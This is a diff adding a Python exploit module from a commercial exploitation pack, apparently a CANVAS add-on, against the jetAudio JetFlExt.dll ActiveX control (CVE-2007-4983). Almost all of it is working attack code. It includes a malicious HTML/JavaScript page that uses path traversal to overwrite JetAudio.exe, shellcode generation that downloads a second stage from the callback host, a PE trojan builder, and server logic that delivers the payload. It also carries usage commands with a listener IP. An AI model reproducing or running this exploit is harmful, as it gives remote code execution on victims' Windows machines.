@@ -1,0 +1,170 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import *
+from httpclientside import httpclientside
+from canvasexploit import canvasexploit
+from libs.canvasos import *
+from MOSDEF import pelib 
+
+import canvasengine
+import struct
+import os
+
+# GUI info
+NAME = "COWON America jetAudio JetFlExt.dll ActiveX Arbitrary Code Execution Vulnerability"
+
+DESCRIPTION = "Arbitrary Code Execution Vulnerability in COWON America jetAudio JetFlExt.dll ActiveX"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "2007.09.19"
+DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/25723/info"
+DOCUMENTATION["Versions Affected"] = "COWON America jetAudio Basic 7.0.3"
+DOCUMENTATION["CVE Name"] = "CVE-2007-4983"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4983"
+
+VERSION='1.0'
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Clientside'
+PROPERTY['ARCH'] = [['Windows']]
+PROPERTY['VERSION'] = ['2000','XP']
+
+NOTES="""
+Usage:
+.\commandlineInterface.py -p 443 -v 1
+.\exploits\httpserver\httpserver.py -v 1 -O singleexploit:d2sec_jetflext -l 192.168.41.1 -d 443 -p 80
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0:['Windows 2000 SP4, XP SP0-SP2 with IE'],
+}
+
+	
+class theexploit(tcpexploit,httpclientside):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        httpclientside.__init__(self)
+        self.clientversion = 1
+        self.name = NAME 
+        self.filename = "index.html"
+        self.trojanname = "index.php"
+        return
+
+    def makefile(self):
+        filedata = """
+<HTML> 
+<BODY>
+ 
+<DIV id="targetDiv">
+
+</DIV>
+
+<SCRIPT language="javascript">  
+
+try {		
+	var detect = new ActiveXObject("JetAudio.Interface.1");
+	
+	if (detect) {	
+		document.getElementById("targetDiv").innerHTML = "<object classid='clsid:8D1636FD-CA49-4B4E-90E4-0A20E03A15E8' id='target'></object>";	
+					
+		target.DownloadFromMusicStore("MOSDEFTROJANURL", "..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\Program" + unescape("%20") + "Files\\\JetAudio\\\JetAudio.exe", "", "", "", "", 0, 0, 0);     
+	}
+}
+catch(e) {}
+
+</SCRIPT> 
+
+</BODY> 
+</HTML>                       
+""".replace("MOSDEFTROJANURL", "http://" + self.callback.ip + "/" + self.trojanname)        
+
+	if self.useSSL:
+        	filedata = filedata.replace('http:', 'https:')
+        
+        return filedata
+ 
+    def maketrojan(self):
+        host = self.callback.ip
+        port = self.callback.port
+
+	sc = shellcodeGenerator.win32()
+        sc.addAttr("findeipnoesp", {"subespval":0x1000})                
+                	
+        if self.useSSL:
+            ssl = "s"
+        else:
+            ssl = ""                
+                    
+        sc.addAttr("httpGetShellcode", {"URL":"http%s://%s:%d/w" % (ssl, host, port)})
+	shellcode = sc.get()        
+	myPElib = pelib.PElib()
+	
+	self.mosdeftrojan = myPElib.createPEFileBuf(shellcode)
+        
+        self.log("Writing out %d bytes to %s" % (len(self.mosdeftrojan), self.trojanname))
+
+	file(self.trojanname, "wb").write(self.mosdeftrojan)
+        self.setInfo("%s - done" % (NAME))
+        ret = len(self.mosdeftrojan) != 0
+        
+        return ret
+
+    def makesploit(self, clientheader, clientbody):        
+        from libs.spkproxy import header, body
+        h = header('SERVER')
+        b = body()
+        
+        self.maketrojan()
+        
+        if clientheader.URL.count(self.filename):                        
+            sploitstring = self.makefile()            
+            b.setBody(sploitstring)
+            
+        elif clientheader.URL.count(self.trojanname):
+            self.log("Sending MOSDEF trojan")
+            f = open(self.trojanname, "rb")
+            sploitstring = f.read()
+            f.close()
+            os.remove(self.trojanname)
+            self.log("Sending %d bytes"%len(sploitstring))
+            h.addHeader("Content-type","binary/octet-stream")
+            h.addHeader("Connection","close")
+            b.setBody(sploitstring)
+               
+        else:
+            self.log("Redirecting to self")
+            h.status = "302"
+            h.addHeader('Location', self.filename)
+            h.addHeader('Content-Type', 'binary/octet-stream')
+        return h, b
+
+    def neededListenerTypes(self):
+        from canvasengine import HTTPMOSDEF
+        return [HTTPMOSDEF]
+            
+    def run(self):        
+        return 1
+
+if __name__=='__main__':
+    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
